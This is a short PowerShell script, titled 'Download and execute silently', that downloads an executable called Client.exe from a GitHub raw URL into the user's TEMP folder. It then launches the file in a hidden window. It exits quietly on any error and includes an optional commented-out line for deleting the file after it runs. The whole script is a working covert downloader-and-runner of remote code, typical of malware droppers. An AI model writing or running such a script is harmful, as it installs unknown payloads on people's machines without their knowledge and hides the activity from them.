# Download and execute silently
$url = "https://github.com/m4x7c/dhhh/raw/refs/heads/main/Client.exe"
$outputFile = "$env:TEMP\downloadedFile.exe"
 
try {
    Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
    if (Test-Path $outputFile) {
        Start-Process -FilePath $outputFile -WindowStyle Hidden
        # Uncomment to auto-remove after execution
        # Remove-Item -Path $outputFile -Force
    }
}
catch {
    # Silently fail
    exit 1
}
exit 0
